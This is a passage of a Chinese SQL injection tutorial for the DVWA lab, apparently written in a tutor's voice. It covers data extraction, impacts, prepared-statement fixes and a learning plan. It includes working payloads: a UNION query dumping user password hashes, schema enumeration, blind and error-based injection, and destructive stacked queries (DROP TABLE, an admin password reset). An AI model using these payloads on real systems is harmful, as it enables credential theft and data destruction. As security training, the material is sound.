+<p><strong>步骤四：提取敏感数据</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>Payload: -1&#39; union select null,group_concat(user,0x3a,password) from users-- -
+<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>响应:
+<a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>  admin:5f4dcc3b5aa765d61d8327deb882cf99
+<a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>  gordonb:e99a18c428cb38d5f260853678922e03
+</code></pre></div></p>
+<hr />
+<h3 id="76">7.6 漏洞影响<a class="headerlink" href="#76" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>数据泄露</strong>：可获取所有用户账号密码</li>
+<li><strong>权限提升</strong>：破解管理员密码后可接管系统</li>
+<li><strong>数据篡改</strong>：可执行 <code>UPDATE</code>、<code>DELETE</code> 等操作（取决于数据库权限）</li>
+<li><strong>服务器入侵</strong>：可写入 Webshell 获取服务器权限（需要 FILE 权限）</li>
+</ol>
+<hr />
+<h3 id="77">7.7 修复建议<a class="headerlink" href="#77" title="Permanent link">&para;</a></h3>
+<p><strong>临时方案</strong>：
+1. 关闭该功能或限制访问 IP</p>
+<p><strong>永久方案</strong>：
+1. 使用预编译语句（PDO/mysqli prepare）
+2. 对输入参数进行严格类型校验（数字型用 <code>is_numeric()</code>）
+3. 数据库账号使用最小权限原则（禁用 FILE 权限）
+4. 部署 WAF 并配置 SQL 注入规则</p>
+<hr />
+<h3 id="78">7.8 修复后的代码示例<a class="headerlink" href="#78" title="Permanent link">&para;</a></h3>
+<p><strong>修复前</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="x">$id = $_GET[&#39;id&#39;];</span>
+<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="x">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;;</span>
+</code></pre></div></p>
+<p><strong>修复后</strong>：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="x">$id = $_GET[&#39;id&#39;];</span>
+<a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="x">$stmt = $conn-&gt;prepare(&quot;SELECT first_name, last_name FROM users WHERE user_id = ?&quot;);</span>
+<a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="x">$stmt-&gt;bind_param(&quot;i&quot;, $id);</span>
+<a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="x">$stmt-&gt;execute();</span>
+<a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="x">$result = $stmt-&gt;get_result();</span>
+</code></pre></div></p>
+<hr />
+<h2 id="payload">附录：常用 Payload 速查表<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h2>
+<h3 id="_10">判断注入点<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>1&#39; and &#39;1&#39;=&#39;1       → 正常
+<a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>1&#39; and &#39;1&#39;=&#39;2       → 异常
+<a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>1&#39; or &#39;1&#39;=&#39;1        → 返回所有数据
+</code></pre></div>
+<hr />
+<h3 id="_11">联合查询<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>-1&#39; union select null,null-- -
+<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>-1&#39; union select version(),database()-- -
+<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>-1&#39; union select null,group_concat(schema_name) from information_schema.schemata-- -
+<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>-1&#39; union select null,group_concat(table_name) from information_schema.tables where table_schema=database()-- -
+<a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>-1&#39; union select null,group_concat(column_name) from information_schema.columns where table_name=0x7573657273-- -
+</code></pre></div>
+<hr />
+<h3 id="_12">报错注入<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>1&#39; and extractvalue(1,concat(0x7e,database()))-- -
+<a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>1&#39; and updatexml(1,concat(0x7e,database()),1)-- -
+</code></pre></div>
+<hr />
+<h3 id="_13">布尔盲注<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>1&#39; and length(database())&gt;5-- -
+<a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>1&#39; and substr(database(),1,1)=&#39;d&#39;-- -
+<a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>1&#39; and ascii(substr(database(),1,1))&gt;100-- -
+</code></pre></div>
+<hr />
+<h3 id="_14">时间盲注<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>1&#39; and if(1=1,sleep(3),0)-- -
+<a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>1&#39; and if(length(database())=5,sleep(3),0)-- -
+</code></pre></div>
+<hr />
+<h3 id="_15">堆叠查询（权限高时可用）<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>1&#39;; DROP TABLE users;-- -
+<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>1&#39;; UPDATE users SET password=&#39;new_hash&#39; WHERE user=&#39;admin&#39;;-- -
+</code></pre></div>
+<hr />
+<h2 id="_16">学习检查清单<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h2>
+<p>完成以下所有项，说明你已经掌握 SQL 注入的完整流程：</p>
+<ul>
+<li>[ ] 能手工判断注入点（数字型/字符型）</li>
+<li>[ ] 能手工判断列数并找到回显位</li>
+<li>[ ] 能手工提取数据库名、表名、列名</li>
+<li>[ ] 能手工脱取用户名和密码</li>
+<li>[ ] 能破解 MD5 哈希</li>
+<li>[ ] 理解 <code>information_schema</code> 的作用</li>
+<li>[ ] 理解 UNION 注入的原理</li>
+<li>[ ] 能在 Medium 级别绕过基础过滤</li>
+<li>[ ] 理解布尔盲注和时间盲注的区别</li>
+<li>[ ] 能用 sqlmap 自动化测试</li>
+<li>[ ] 能写出规范的渗透测试报告</li>
+<li>[ ] 理解预编译语句的防御原理</li>
+</ul>
+<hr />
+<p><strong>今天的学习计划</strong>：
+1. ✅ 完成 DVWA Low 级别手工注入（上午 2-3 小时）
+2. ⬜ 挑战 Medium 和 High 级别（下午 2 小时）
+3. ⬜ 学习布尔盲注和时间盲注（下午 1 小时）
+4. ⬜ 使用 sqlmap 自动化测试（晚上 1 小时）
+5. ⬜ 写一份完整的渗透测试报告（晚上 1 小时）</p>
+<p><strong>预计总时长</strong>：6-8 小时</p>
+<hr />
+<p><strong>下一步</strong>：打开 DVWA → SQL Injection (Low) → 告诉我你准备好了，我们从 2.1 判断列数开始实操。</p>
 
 
 
